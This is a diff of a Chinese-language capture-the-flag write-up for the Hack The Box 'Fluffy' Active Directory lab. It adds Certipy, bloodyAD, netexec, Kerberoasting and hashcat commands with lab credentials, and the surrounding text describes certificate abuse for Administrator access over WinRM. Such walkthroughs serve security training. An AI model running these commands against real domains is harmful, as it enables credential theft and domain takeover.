@@ -449,6 +449,10 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
     sAMAccountName                      : ca_svc
     servicePrincipalName                : ADCS/ca.fluffy.htb
 //没有看到 userPrincipalName为ca_svc@fluffy.htb
+
+$ certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.60.36 -user ca_svc -upn winrm_svc update
+
+$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.56.0 add groupMember 'service accounts' p.agila
 ```
 ```
 #certipy req \
@@ -492,3 +496,24 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 #### 这将为Administrator用户保存证书。可以。在使用这个之前ca_svc用户修改后的UPN需要更新为正确的UPN。
 #### 最后，让我们使用管理员。获取Administrator用户的RC4哈希值。
 #### 使用这个RC4哈希，我们可以通过WinRM作为Administrator用户访问目标。
+
+$ nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
+
+$ rusthound-ce --domain fluffy.htb -u j.fleishman -p 'J0elTHEM4n1990!'
+
+$ sudo ntpdate fluffy.htb 
+$ nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt  
+
+$ scp output.txt kracken:
+$ ssh kracken
+#  mv output.txt hashcat/hashes/fluffy.krb
+# cd hashcat
+# ./hashcat hashes/fluffy.krb /opt/wordlists/rockyou.txt
+# ./hashcat -m 13100 hashes/fluffy.krb /opt/wordlists/rockyou.txt
+
+
+$ cd /opt/bloodhound/server/
+$ docker compose up -d
+
+浏览器 http://localhost:8080
+
